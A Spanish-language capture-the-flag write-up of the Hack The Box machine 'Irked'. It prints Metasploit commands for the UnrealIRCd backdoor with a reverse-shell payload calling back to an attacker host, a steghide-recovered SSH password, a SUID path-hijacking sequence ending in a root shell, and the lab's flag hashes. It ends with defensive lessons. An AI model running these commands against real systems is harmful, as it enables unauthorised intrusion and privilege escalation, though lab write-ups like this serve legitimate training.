HTB: Irked Write-upIrked es una máquina Linux de dificultad "Easy". 

El vector de entrada consiste en la explotación de un backdoor en el servicio UnrealIRCd. 
La escalada de privilegios implica técnicas de esteganografía para el movimiento lateral y el abuso de un binario con permisos SUID mediante Path Hijacking.

Fase de Reconocimiento:

(Reconnaissance)Escaneo de PuertosRealizamos un escaneo inicial para identificar puertos abiertos:

sudo nmap -p- -sS --min-rate 5000 -Pn -n 10.129.3.46 -oG allPorts
Posteriormente, realizamos un escaneo de servicios y versiones sobre los puertos detectados:

nmap -sCV -p 22,80,111,6697,8067,65534 10.129.3.46 -oN targeted
PuertoServicioVersión22SSHOpenSSH 6.7p180HTTPApache httpd 2.4.106697IRCUnrealIRCd2. 

Acceso Inicial (Exploitation)CVE-2010-2075: 
UnrealIRCd 3.2.8.1 BackdoorEl puerto 6697 corre una versión de UnrealIRCd conocida por contener un backdoor histórico. 

Utilizamos Metasploit para obtener ejecución remota de comandos.Bashmsfconsole

use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.129.3.46
set RPORT 6697
set PAYLOAD cmd/unix/reverse
set LHOST <10.10.14.93>
exploit

Tras obtener la shell, la estabilizamos:Bashpython3 -c 'import pty; pty.spawn("/bin/bash")'

Movimiento Lateral (User Pivoting)EsteganografíaDentro del sistema, como usuario ircd, encontramos un archivo de backup en /home/djmardov/Documents/.backup. 
Este contenía la cadena: UPupDOWNdownLRlrBAbaSSss.En el servidor web (puerto 80) se encuentra el archivo irked.jpg. Descargamos la imagen y 
extraemos la información oculta:Bashsteghide extract -sf irked.jpg

# Introducir el password del backup

Esto genera pass.txt, que contiene la contraseña de SSH para el usuario djmardov: Kab6h+m+bbp2J:HG.4. Escalada de Privilegios 
(Privilege Escalation)Abuso de Binarios SUIDBuscamos binarios con permisos SUID:Bashfind / -perm -4000 2>/dev/null
Detectamos /usr/bin/viewuser. Al ejecutarlo, el programa intenta llamar a /tmp/listusers. 
Dado que no utiliza rutas absolutas de forma segura y podemos escribir en /tmp, realizamos un Path Hijacking:Bashecho "/bin/bash -p" > /tmp/listusers
chmod +x /tmp/listusers
/usr/bin/viewuser

Nota: El flag -p en bash es necesario para que el proceso no suelte los privilegios de root al detectar que el UID efectivo es 0 (root) pero el real es del usuario.5. 

FlagsUser: 598533e09aa88fea251d65bee1c82fdf
Root:      88b535387e56159cb5bd88f39a0d6f5f

Lecciones Aprendidas (Lessons Learned)Gestión de versiones: No utilizar software obsoletos (UnrealIRCd 3.2.8.1) en producción.Seguridad de Binarios: 

Evitar la creación de programas SUID que invoquen otros scripts mediante rutas relativas o carpetas temporales (/tmp) de escritura pública.
